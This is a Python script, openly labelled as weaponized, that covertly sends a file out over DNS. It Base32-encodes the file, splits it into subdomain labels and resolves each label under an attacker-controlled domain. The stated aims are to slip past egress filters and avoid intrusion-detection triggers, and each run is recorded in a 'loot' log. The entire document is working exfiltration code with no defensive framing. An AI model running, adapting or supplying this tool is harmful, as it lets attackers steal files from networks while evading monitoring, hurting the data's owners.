import sys
import socket
import base64
import time
import os

def tunnel_dns(file_path, domain, delay=0.1):
    """
    Weaponized DNS Exfil: Chunks binary data into Base32 subdomains 
    to bypass egress filters. 
    """
    if not os.path.exists(file_path):
        print(f"[-] File not found: {file_path}")
        return

    print(f"[*] Preparing exfiltration for: {file_path}")
    
    with open(file_path, 'rb') as f:
        raw_data = f.read()
    
    # Base32 is required for DNS subdomains (case-insensitive, no special chars)
    encoded_data = base64.b32encode(raw_data).decode().replace('=', '')
    
    # DNS labels are limited to 63 characters; we use 50 for safety
    chunk_size = 50
    chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
    
    total = len(chunks)
    print(f"[*] Chunks to transmit: {total} | Destination: {domain}")
    print("-" * 60)

    for i, chunk in enumerate(chunks):
        # Format: [sequence].[data_chunk].[domain]
        query = f"p{i}.{chunk}.{domain}"
        
        print(f"[*] Sending Chunk {i+1}/{total}: {query[:30]}...")
        
        try:
            # We use gethostbyname to trigger a standard OS-level DNS lookup
            socket.gethostbyname(query)
        except socket.gaierror:
            # Expected error as the domain likely won't resolve to an IP
            pass
        
        # Delay to avoid rate-limiting or IDS triggers
        if delay > 0:
            time.sleep(delay)

    print("-" * 60)
    print(f"[!] EXFILTRATION DISPATCHED. Reconstruct at NS logs for {domain}")
    
    with open("../loot/dns_exfil_history.log", "a") as log:
        log.write(f"Target: {domain} | File: {file_path} | Chunks: {total}\n")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 136_dns_exfil <file_to_send> <attacker_domain> [delay_seconds]")
        sys.exit(1)
    
    wait_time = float(sys.argv[3]) if len(sys.argv) > 3 else 0.1
    tunnel_dns(sys.argv[1], sys.argv[2], wait_time)
